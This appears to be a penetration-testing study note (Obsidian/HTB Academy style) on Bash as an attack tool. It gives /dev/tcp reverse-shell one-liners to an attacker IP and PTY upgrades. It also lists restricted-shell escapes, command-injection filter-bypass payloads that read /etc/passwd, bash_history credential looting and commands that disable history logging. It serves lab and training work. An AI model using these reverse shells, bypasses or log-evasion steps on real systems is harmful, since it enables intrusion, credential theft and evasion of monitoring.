# Bash

**Tags:** `#bash` `#shell` `#linux` `#reverseshell` `#restrictedshellescape` `#commandinjection` `#postexploitation`

The default Linux/Unix shell and the environment you live in on both your attack box and
most targets — the Linux counterpart to [[Tools/Command Shell/Powershell|PowerShell]]. Its
engagement value beyond running commands: a built-in **`/dev/tcp` reverse shell** with no
extra binary, **restricted-shell (`rbash`) escapes**, TTY upgrades, command-injection
obfuscation for filter bypass, and history-logging awareness.

**Docs:** https://www.gnu.org/software/bash/manual/
**Install:** preinstalled on virtually every Linux host (`/bin/bash`). Note `sh`/`dash`
(Debian's `/bin/sh`) is **not** bash — the `/dev/tcp` trick below needs real bash.

> [!warning] **macOS ships bash 3.2** (2007 — the last GPLv2 release; `zsh` is the default there).
> Associative arrays, `${var,,}` case conversion, and `mapfile`/`readarray` **don't exist** on stock
> macOS bash — one-liners written for bash 4/5 silently fail. Check with `bash --version`; use `zsh`
> or a Homebrew bash if you need modern features. `/dev/tcp` *does* work in macOS bash 3.2.

---

## Reverse Shells (no extra binary)

Bash can open a TCP socket via the `/dev/tcp/<host>/<port>` pseudo-device — so a reverse
shell needs nothing but bash itself. Catch it with `nc -lvnp 9001` on your box.

```bash
# The classic one-liner
bash -i >& /dev/tcp/10.10.14.5/9001 0>&1

# When the target's /bin/sh isn't bash, force bash explicitly:
bash -c 'bash -i >& /dev/tcp/10.10.14.5/9001 0>&1'

# FD-based variant (survives some filters / when >& is stripped)
exec 5<>/dev/tcp/10.10.14.5/9001; cat <&5 | while read l; do $l 2>&5 >&5; done
```

> [!tip] Use your listener-port convention (**9001+**) for the catcher and **8001+** for a
> `python3 -m http.server 8001` payload host. Full reverse/bind-shell catalogue + language
> variants: [[Class notes/HTB Academy/CPTS v2 (claude)/Shells & Payloads|Shells & Payloads]].

### Upgrade a dumb shell to a full PTY

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'   # (or python / script -qc /bin/bash /dev/null)
# then background with Ctrl-Z, and in YOUR local shell:
stty raw -echo; fg
# back in the shell:
export TERM=xterm; export SHELL=/bin/bash; stty rows 50 cols 200
```

Catch the shell inside [[Tools/Command Shell/tmux|tmux]] so a dropped VPN doesn't kill it.

---

## Restricted Shell (rbash) Escape

`rbash`/`rksh`/menu shells block `cd`, `/` in commands, `PATH` changes, and output redirection.
Common escapes when you land in one:

```bash
# If any of these binaries are reachable, they spawn an unrestricted shell:
vi           # then  :set shell=/bin/bash  →  :shell     (see Vim note)
awk 'BEGIN{system("/bin/bash")}'
find . -exec /bin/bash \;
# Language interpreters:
python3 -c 'import os; os.system("/bin/bash")'
perl -e 'exec "/bin/bash";'

# Start bash without the restricted profile / with a clean env:
bash --noprofile
ssh user@host -t "bash --noprofile"          # request a non-restricted shell at login
BASH_CMDS[a]=/bin/sh; a                       # abuse the command hash (older bash)
export PATH=/bin:/usr/bin:$PATH               # if PATH edits aren't blocked, un-cage the tools
```

See the full GTFOBins-driven set in [[Class notes/HTB Academy/CPTS v2 (claude)/Linux Priv Esc|Linux Priv Esc]].

---

## Command-Injection Obfuscation (filter / WAF bypass)

When you have command injection but the input is filtered, bash quoting/expansion hides
keywords and spaces from naive blocklists:

```bash
# Spaces without a space: ${IFS} or <  (works in most injection contexts)
cat${IFS}/etc/passwd
cat</etc/passwd

# Break up keywords the filter greps for
c\at /etc/passwd            # backslash
c""at /etc/passwd           # empty quotes
who$@ami                    # $@ expands to nothing

# Brace expansion = comma-separated argv, no spaces
{cat,/etc/passwd}

# Wildcards instead of literal paths
/???/c?t /???/p??s??        # /bin/cat /etc/passwd

# Build a blocked word from a reversed string
$(rev<<<'dwapssap/cte/ tac')
```

Injection sinks and where this applies: [[Class notes/HTB Academy/CPTS v2 (claude)/File Inclusion|File Inclusion]] / command-injection sections.

---

## History & Logging Awareness

```bash
# Your commands are logged to ~/.bash_history on exit — a loot target AND a self-OPSEC risk.
cat ~/.bash_history                 # loot: creds, hosts, paths typed by the user
sudo cat /root/.bash_history

# Don't log YOUR session's commands on a target:
unset HISTFILE                      # or:  export HISTFILE=/dev/null
set +o history                      # disable history for this shell
kill -9 $$                          # exit without flushing history (nuclear)
#   with HISTCONTROL=ignorespace set, a LEADING SPACE keeps one command out of history
```

---

## Handy Operator Builtins

```bash
IFS=$'\n'                                   # loop safely over lines with spaces
for h in $(cat hosts.txt); do echo "== $h =="; ssh $h 'hostname; id'; done
mapfile -t users < users.txt                # read a file into an array
timeout 5 nc -zv 10.10.10.10 445            # bound a hanging command
command -v python3 || command -v python     # find an available interpreter
compgen -c | sort -u                        # list every command in PATH (recon in a restricted shell)
```

---

## Quick Reference

| Goal | Command |
|---|---|
| Reverse shell (no binary) | `bash -i >& /dev/tcp/IP/9001 0>&1` |
| Force bash for the revshell | `bash -c 'bash -i >& /dev/tcp/IP/9001 0>&1'` |
| Upgrade to PTY | `python3 -c 'import pty;pty.spawn("/bin/bash")'` → `Ctrl-Z` → `stty raw -echo; fg` |
| Escape rbash | `bash --noprofile` · `vi`→`:!/bin/bash` · `awk 'BEGIN{system("/bin/bash")}'` |
| Space-less injection | `cat${IFS}/etc/passwd` · `{cat,/etc/passwd}` |
| Split a keyword | `c\at` · `c""at` · `who$@ami` |
| Loot history | `cat ~/.bash_history` |
| Don't log my session | `unset HISTFILE` / `set +o history` |
| List all commands (recon) | `compgen -c` |

---

> [!note] **See also** — sibling note, same tool from the **scripting/post-ex** angle (multi-category placement, per DECISIONS D1): [[Tools/Scripting/Bash|Tools/Scripting/Bash]] (more reverse-shell language variants + file-transfer recipes). The Windows counterpart [[Tools/Command Shell/Powershell|PowerShell]]; the macOS/Linux sibling [[Tools/Command Shell/zsh|zsh]] (differences that bite — no `/dev/tcp`) and minimal-box [[Tools/Command Shell/busybox|busybox]]; upgrade a dumb catcher with [[Tools/Command Shell/rlwrap|rlwrap]];
> shell catalogue + TTY upgrades [[Class notes/HTB Academy/CPTS v2 (claude)/Shells & Payloads|Shells & Payloads]];
> rbash/SUID/sudo escapes [[Class notes/HTB Academy/CPTS v2 (claude)/Linux Priv Esc|Linux Priv Esc]];
> keep shells alive across disconnects with [[Tools/Command Shell/tmux|tmux]]; catchers
> [[Tools/Remote Access/Netcat|Netcat]] / [[Tools/Remote Access/socat|socat]].

---

*Created: 2026-09-28*
*Updated: 2026-09-28*
*Model: claude-opus-4-8*
